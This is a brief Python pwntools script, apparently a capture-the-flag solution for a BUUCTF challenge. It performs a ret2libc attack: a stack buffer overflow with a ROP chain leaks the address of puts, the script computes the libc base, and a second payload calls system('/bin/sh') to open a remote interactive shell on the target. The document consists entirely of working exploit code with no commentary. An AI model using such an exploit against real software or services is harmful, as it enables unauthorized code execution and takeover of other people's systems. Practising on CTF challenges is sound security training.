from pwn import *
from LibcSearcher import *
#p=process('./1')
p=remote('node3.buuoj.cn',28753)
elf=ELF('./1')
libc=ELF('libc-2.27_64.so')
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
main=elf.sym['main']
pop_rdi=0x0000000000401223
ret=0x000000000040101a
sleep(0.2)
payload=0x100*'a'+p64(1)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
p.sendline(payload)
puts_addr=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libc.address=puts_addr-libc.sym['puts']
print hex(libc.address)
system=libc.sym['system']
print hex(system)
binsh=libc.address+0x00000000001b3e9a
print hex(binsh)
payload=0x100*'a'+p64(1)+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)+p64(1)
sleep(1)
p.sendline(payload)

p.interactive()
